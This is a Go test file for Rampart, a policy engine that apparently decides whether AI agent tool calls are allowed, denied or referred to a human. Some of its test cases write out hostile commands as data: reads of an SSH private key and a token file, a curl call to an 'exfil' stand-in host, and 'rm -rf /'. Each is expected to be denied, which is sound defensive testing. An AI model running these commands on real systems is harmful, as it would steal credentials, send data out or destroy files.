// Copyright 2026 The Rampart Authors
// Licensed under the Apache License, Version 2.0

package policies

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/peg/rampart/internal/engine"
	"github.com/stretchr/testify/require"
)

func TestGuardLayersOverOpenClawProfile(t *testing.T) {
	dir := t.TempDir()
	for _, profile := range []string{"openclaw", "guard"} {
		content, err := Profile(profile)
		require.NoError(t, err)
		require.NoError(t, os.WriteFile(filepath.Join(dir, profile+".yaml"), content, 0o600))
	}

	eng, err := engine.New(engine.NewMultiStore("", dir, nil), nil)
	require.NoError(t, err)

	tests := []struct {
		name   string
		agent  string
		tool   string
		params map[string]any
		want   engine.Action
	}{
		{name: "routine command", tool: "exec", params: map[string]any{"command": "pwd"}, want: engine.ActionAllow},
		{name: "local commit", tool: "exec", params: map[string]any{"command": "git commit -m safe"}, want: engine.ActionAsk},
		{name: "publish commit", tool: "exec", params: map[string]any{"command": "git push origin main", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "non-OpenClaw publish uses base posture", agent: "claude-code", tool: "exec", params: map[string]any{"command": "git push origin main"}, want: engine.ActionAsk},
		{name: "read cluster", tool: "exec", params: map[string]any{"command": "kubectl get pods"}, want: engine.ActionAllow},
		{name: "change cluster", tool: "exec", params: map[string]any{"command": "kubectl apply -f deployment.yaml", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "privileged change", tool: "exec", params: map[string]any{"command": "sudo apt update", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "credential shell read", tool: "exec", params: map[string]any{"command": "cat ~/.ssh/id_rsa", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
		{name: "Rampart token shell read", tool: "exec", params: map[string]any{"command": "cat ~/.rampart/token", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
		{name: "external curl", tool: "exec", params: map[string]any{"command": "curl https://example.invalid/exfil", "rampart_integration": "openclaw"}, want: engine.ActionDeny},
		{name: "opaque Python", tool: "exec", params: map[string]any{"command": "python3 -c 'print(1)'", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "package publish", tool: "exec", params: map[string]any{"command": "npm publish", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "compose mutation", tool: "exec", params: map[string]any{"command": "docker compose down", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "hard deny still wins", tool: "exec", params: map[string]any{"command": "rm -rf /"}, want: engine.ActionDeny},
		{name: "read messages", tool: "message", params: map[string]any{"action": "read", "rampart_consequence": "openclaw:read-only", "rampart_integration": "openclaw"}, want: engine.ActionAllow},
		{name: "reply in place", tool: "message", params: map[string]any{"action": "send", "rampart_consequence": "openclaw:routine-reply", "rampart_integration": "openclaw"}, want: engine.ActionAllow},
		{name: "contact another recipient", tool: "message", params: map[string]any{"action": "send", "rampart_consequence": "openclaw:external-message", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "mutate a message", tool: "message", params: map[string]any{"action": "delete", "rampart_consequence": "openclaw:mutation", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "unclassified message", tool: "message", params: map[string]any{"action": "future-action", "rampart_consequence": "openclaw:future", "rampart_integration": "openclaw"}, want: engine.ActionAsk},
		{name: "non-OpenClaw message uses base posture", agent: "claude-code", tool: "message", params: map[string]any{"action": "send", "rampart_consequence": "external-message"}, want: engine.ActionAllow},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			agent := tt.agent
			if agent == "" {
				agent = "openclaw:main"
			}
			call := engine.ToolCall{
				Agent: agent, Session: "guard-test", Tool: tt.tool,
				Params: tt.params, Input: tt.params,
			}
			got := eng.Evaluate(call)
			require.Equal(t, tt.want, got.Action, "decision: %s (%s)", got.Action.String(), got.Message)
		})
	}
}
